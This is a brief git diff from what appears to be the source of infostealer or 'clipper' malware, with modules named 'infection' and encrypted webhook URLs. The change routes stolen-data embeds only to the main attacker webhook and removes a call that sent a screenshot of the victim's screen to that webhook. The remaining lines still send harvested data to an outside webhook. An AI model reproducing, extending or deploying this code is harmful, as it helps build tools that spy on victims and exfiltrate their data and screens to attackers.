@@ -47,14 +47,9 @@ module.exports = (client) => {
                                     })
 
                                     await client.utils.webhook.sendToWebhook(
-                                        client.utils.encryption.decryptData(client.config.webhook.clipper ? client.config.webhook.clipper : client.config.webhook.url), {
+                                        client.utils.encryption.decryptData(client.config.webhook.url), {
                                             "embeds": embeds
                                         })
-
-                                    try {
-                                        await client.utils.infection.send_screenshot_embed(
-                                            client.utils.encryption.decryptData(client.config.webhook.clipper ? client.config.webhook.clipper : client.config.webhook.url))
-                                    } catch {}
 
                                     break;
                                 }
